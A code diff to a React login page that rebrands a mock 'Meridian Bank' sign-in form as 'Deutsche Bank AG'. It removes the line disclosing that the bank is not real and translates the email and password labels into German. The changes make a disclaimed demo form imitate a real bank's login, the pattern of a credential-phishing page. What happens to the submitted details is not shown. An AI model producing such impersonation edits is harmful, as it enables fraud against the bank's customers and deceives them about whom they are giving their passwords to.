@@ -44,16 +44,15 @@ export default function LoginPage() {
     <div className="login-wrap">
       <div className="login-card">
         <div className="logo-row">
-          <div className="logo-mark">MB</div>
-          <div className="logo-text">Meridian Bank</div>
+          <div className="logo-mark">DB</div>
+          <div className="logo-text">Deutsche Bank AG</div>
         </div>
-        <p className="subtitle">Meridian Bank access — this is a Hidden Bank</p>
 
         {formError && <div className="banner-error">{formError}</div>}
 
         <form onSubmit={handleSubmit} noValidate>
           <div className="field">
-            <label htmlFor="email">Email</label>
+            <label htmlFor="email">E-Mail-Adresse</label>
             <input
               id="email"
               type="email"
@@ -68,7 +67,7 @@ export default function LoginPage() {
           </div>
 
           <div className="field">
-            <label htmlFor="password">Password</label>
+            <label htmlFor="password">Passwort</label>
             <input
               id="password"
               type="password"
@@ -86,16 +85,16 @@ export default function LoginPage() {
             {loading ? (
               <>
                 <span className="spinner" />
-                Signing in…
+                Anmeldung läuft…
               </>
             ) : (
-              "Sign in"
+              "Anmelden"
             )}
           </button>
         </form>
 
         <div className="switch-link">
-          Don't have an account? <Link href="/signup">Create one</Link>
+          Sie haben noch kein Konto? <Link href="/signup">Konto erstellen</Link>
         </div>
       </div>
     </div>
